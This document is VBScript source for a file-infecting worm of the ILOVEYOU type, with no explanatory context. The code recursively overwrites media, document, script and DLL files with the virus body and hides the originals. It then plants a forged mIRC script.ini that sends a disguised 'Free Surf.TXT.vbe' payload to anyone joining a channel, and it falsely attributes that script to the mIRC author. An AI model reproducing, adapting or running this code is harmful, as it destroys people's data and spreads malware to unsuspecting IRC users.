sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,s
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="js") or (ext="zip") or (ext="mid") or (ext="wav") or (ext="gif") or (ext="jpeg") or (ext="jpg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write "rem by <MeisterX or MagicMan or Cyborg or KillerVirus! Have Fun! :)>" & vbscopy
ap.close
elseif(ext="com") or (ext="htm") or (ext="html") or (ext="ace") or (ext="rar") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write "rem by <MeisterX or MagicMan or Cyborg or ViRuS! Have Fun! :)>" & vbscopy
ap.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
elseif(ext="dll") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write "rem by <MeisterX or MagicMan or Cyborg or KillerVirus or ViRuS! Have Fun! :)>" & vbscopy
ap.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
elseif(ext="doc") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write "rem by <MeisterX or MagicMan or Cyborg! Have Fun! :)>" & vbscopy
ap.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
cop.copy(f1.path&".vbs")
elseif(ext="mp3") or (ext="mp2") or (ext="doc") or (ext="gif") or (ext="jpeg") or (ext="bmp") or (ext="zip") (ext="ace") then
set ap=fso.CreateTextFile(f1.path&".vbs")
ap.write "rem by <MeisterX or MagicMan or Cyborg! Have Fun! :)>" & vbscopy
ap.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine "; Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine " corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2= /.dcc send $nick "&dirx&"\Free Surf.TXT.vbe"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next
end sub
sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
End sub
